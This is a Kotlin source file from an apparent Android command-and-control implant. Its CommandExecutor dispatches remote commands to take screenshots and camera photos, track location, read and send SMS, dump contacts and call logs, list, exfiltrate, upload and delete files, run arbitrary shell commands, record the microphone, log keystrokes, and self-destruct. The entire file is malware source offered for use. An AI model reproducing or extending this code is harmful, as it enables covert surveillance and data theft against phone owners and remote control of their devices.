package com.outcome.c2

import android.content.Context
import org.json.JSONObject

object CommandExecutor {

    fun run(ctx: Context, type: String, args: JSONObject): JSONObject = when (type) {
        "device_info"        -> DeviceInfo.snapshot(ctx, DeviceInfo.id(ctx))
        "screenshot"         -> Screenshot.capture(ctx)
        "camera_photo"       -> Camera.capture(ctx, args.optString("camera", "back"))
        "location"           -> Location.get(ctx)
        "sms_list"           -> Sms.list(ctx, args.optInt("limit", 50))
        "sms_send"           -> Sms.send(ctx, args.getString("number"), args.getString("text"))
        "contacts"           -> Contacts.list(ctx)
        "call_log"           -> CallLog.list(ctx, args.optInt("limit", 50))
        "list_apps"          -> Apps.list(ctx, args.optBoolean("system_only", false))
        "list_dir"           -> Files.listDir(args.getString("path"))
        "download_file"      -> Files.exfil(ctx, args.getString("path"))
        "upload_file"        -> Files.upload(ctx, args.getString("remote_path"), args.getString("data_b64"))
        "delete_file"        -> Files.delete(args.getString("path"))
        "shell"              -> Shell.exec(args.getString("cmd"))
        "mic_record"         -> Audio.record(ctx, args.optInt("duration", 10))
        "keylog_start"       -> JSONObject().put("ok", KeylogBuffer.start())
        "keylog_stop"        -> JSONObject().put("ok", KeylogBuffer.stop())
        "keylog_dump"        -> KeylogBuffer.dump()
        "toast"              -> { Ui.toast(ctx, args.optString("text", "")); JSONObject().put("ok", true) }
        "vibrate"            -> { Ui.vibrate(ctx, args.optLong("ms", 500)); JSONObject().put("ok", true) }
        "self_destruct"      -> SelfDestruct.run(ctx)
        else                 -> JSONObject().put("error", "unsupported command: $type")
    }
}
